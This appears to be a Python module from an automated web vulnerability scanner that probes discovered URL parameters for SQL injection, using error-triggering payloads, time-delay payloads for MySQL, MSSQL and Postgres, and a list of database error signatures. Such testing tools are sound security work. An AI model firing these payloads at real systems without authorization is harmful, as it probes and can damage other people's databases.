"""
Stage 15: SQLi Detection — error-based + time-based indicators.

Tests parameters scored as SQLi candidates.
"""

from datetime import datetime, timezone
from rich.console import Console
from urllib.parse import urlencode
import time
import re

console = Console()

# SQLi test payloads (detection only — no data exfiltration)
SQLI_ERROR_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "1' AND '1'='2",
    "1 UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:0'--",
]

# SQL error signatures
SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for sql server",
    r"pg_query\(\).*error",
    r"supplied argument is not a valid.*result",
    r"ora-\d{5}",
    r"sqlite3\.operationalerror",
    r"jdbc\..*exception",
    r"syntax error.*at or near",
    r"unterminated.*string",
    r"sqlstate\[",
]

SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)

# Time-based: inject delay, measure response
TIME_PAYLOADS = {
    "mysql": "' OR SLEEP(5)-- -",
    "mssql": "'; WAITFOR DELAY '0:0:5'-- -",
    "postgres": "'; SELECT pg_sleep(5)-- -",
}

TIME_THRESHOLD = 4.5  # seconds


def run(ctx):
    """Execute SQLi detection."""
    import httpx as httpx_lib

    if not ctx.config.get("vuln.sqli_enabled", True):
        console.print("  [dim]SQLi detection disabled[/dim]")
        return

    params = ctx.stores.params.read_all()
    if not params:
        console.print("  [dim]No params to test for SQLi[/dim]")
        return

    # Filter for SQLi candidates
    candidates = []
    for p in params:
        tags = p.get("risk_tags", [])
        if "sqli_candidate" in tags or "idor_candidate" in tags:
            candidates.append((p.get("endpoint", ""), p.get("params", [])))

    # Also include any param with numeric-sounding names
    for p in params:
        endpoint = p.get("endpoint", "")
        for param_name in p.get("params", []):
            if any(k in param_name.lower() for k in ["id", "num", "count", "page", "limit", "offset"]):
                if (endpoint, [param_name]) not in candidates:
                    candidates.append((endpoint, [param_name]))

    candidates = candidates[:20]  # Safety limit
    console.print(f"  [dim]Testing {len(candidates)} endpoints for SQLi...[/dim]")

    count = 0
    for endpoint, param_names in candidates:
        for param in param_names:
            # Phase 1: Error-based detection
            for payload in SQLI_ERROR_PAYLOADS[:3]:
                ctx.rate_limiter.acquire()
                try:
                    test_url = f"{endpoint}?{urlencode({param: payload})}"
                    resp = httpx_lib.get(
                        test_url, timeout=15, follow_redirects=True, verify=False
                    )

                    if SQL_ERROR_RE.search(resp.text):
                        if ctx.stores.vulns.add({
                            "type": "sqli_error",
                            "url": endpoint,
                            "param": param,
                            "severity": "high",
                            "evidence": {
                                "payload": payload,
                                "error_match": SQL_ERROR_RE.search(resp.text).group(0),
                                "detection": "error-based",
                            },
                            "timestamp": datetime.now(timezone.utc).isoformat(),
                        }):
                            count += 1
                            console.print(
                                f"  [bold red]🔥 SQLi (error): {param} on {endpoint}[/bold red]"
                            )
                        break

                except Exception:
                    continue

            # Phase 2: Time-based detection (only if error-based didn't find anything)
            for db_type, payload in TIME_PAYLOADS.items():
                ctx.rate_limiter.acquire()
                try:
                    test_url = f"{endpoint}?{urlencode({param: payload})}"
                    start = time.time()
                    resp = httpx_lib.get(
                        test_url, timeout=20, follow_redirects=True, verify=False
                    )
                    elapsed = time.time() - start

                    if elapsed >= TIME_THRESHOLD:
                        if ctx.stores.vulns.add({
                            "type": "sqli_time",
                            "url": endpoint,
                            "param": param,
                            "severity": "high",
                            "evidence": {
                                "payload": payload,
                                "delay_seconds": round(elapsed, 2),
                                "detection": "time-based",
                                "suspected_db": db_type,
                            },
                            "timestamp": datetime.now(timezone.utc).isoformat(),
                        }):
                            count += 1
                            console.print(
                                f"  [bold red]🔥 SQLi (time-based, {db_type}): "
                                f"{param} on {endpoint} ({elapsed:.1f}s)[/bold red]"
                            )
                        break

                except Exception:
                    continue

    console.print(f"  [dim]SQLi findings: {count}[/dim]")
